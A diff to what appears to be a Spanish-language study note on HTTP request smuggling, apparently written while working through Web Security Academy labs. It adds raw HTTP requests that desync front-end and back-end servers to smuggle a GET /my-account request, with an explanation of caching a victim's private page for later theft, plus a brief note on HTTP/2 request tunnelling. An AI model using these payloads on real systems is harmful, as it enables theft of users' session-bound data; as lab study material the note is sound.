@@ -215,7 +215,7 @@ Test: A
 Realizamos un ataque de **request smuggling tipo CL.0**, donde el servidor *back-end* ignora el encabezado `Content-Length` en ciertas rutas, permitiendo **inyectar una segunda petición** dentro del cuerpo de una `POST` aparentemente legítima.
 -- -
 ## **Smuggling ocultando el header TE**
-**Request1**
+**Request**
 ```http
 POST / HTTP/1.1
 Host: domain.com
@@ -235,3 +235,34 @@ testing=test
 **Explicacion**
 - Se busca lograr una inconsistencia, a veces el **back-end** al ver que hay 2 encabezados igual con valores distintos, decide ignorar los 2 e interpretar por **`Content-Length`**
 -- -
+## **HTTP request smuggling to perform web cache deception**
+**Request1:**
+```http
+POST / HTTP/1.1
+Host: domain.com
+Transfer-Encoding: chunked
+Content-Length: 38
+
+0
+
+GET /my-account HTTP/1.1
+Test: a
+```
+
+**Request2:**
+```http
+GET /resources/js/tracking.js HTTP/2
+Host: 0a740013030f53638047214c0098007f.web-security-academy.net
+```
+
+**Explicacion:**
+- Las cookies de sesión de la víctima se aplican al `GET /my-account` smuggleado, el back-end responde con la página privada, el front-end asocia esa respuesta a la URL `/resources/js/tracking.js` y la cachea, permitiendo que el atacante luego acceda a esa URL y obtenga el contenido sensible desde la caché.
+--- 
+## HTTP/2 request tunnelling
+![[Pasted image 20250822181550.png]]
+*Aclaración:* 
+- La inyeccion de este tipo de datos a veces genera que el **Front-end** revele mas data de la que deberia revelar.
+![[Pasted image 20250822181959.png]]
+*Aclaración:* 
+- Con las cabeceras internas filtradas gracias a la primer imagen, logramos agregarlas a la nueva request embebida la cual se inyecta en la parte del nombre del header.
+- Tambien vale la pena cambiar los valores de esos headers para buscar respuestas distintas por parte del servidor.
